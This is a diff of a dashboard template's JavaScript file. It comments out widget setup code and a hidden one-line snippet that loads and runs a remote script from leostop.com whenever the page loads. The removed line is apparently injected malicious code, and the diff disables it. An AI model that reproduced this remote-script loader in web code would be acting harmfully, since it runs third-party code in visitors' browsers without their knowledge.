@@ -19,24 +19,24 @@ $(document).ready(function () {
     $('#sidebar').toggleClass('active');
   });
   /*-- calendar js --*/
-  $('#example14').calendar({
+  /*$('#example14').calendar({
     inline: true
-  });
-  $('#example15').calendar();
+  });*/
+  //$('#example15').calendar();
   /*-- tooltip js --*/
-  $('[data-toggle="tooltip"]').tooltip();
+  //$('[data-toggle="tooltip"]').tooltip();
 });
 
 /*--------------------------------------
     scrollbar js
 --------------------------------------*/
 
-var ps = new PerfectScrollbar('#sidebar');
+// var ps = new PerfectScrollbar('#sidebar');
 
 /*--------------------------------------
     chart js
 --------------------------------------*/
-
+/*
 $(function () {
   new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
   new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
@@ -44,7 +44,7 @@ $(function () {
   new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
   new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
   new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
-});
+});*/
 
 function getChartJs(type) {
   var config = null;
@@ -159,7 +159,11 @@ function getChartJs(type) {
   return config;
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+/*
+function getURL() {
+   window.location.href; 
+  } 
+  var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });*/
 
 /*--------------------------------------
     map js
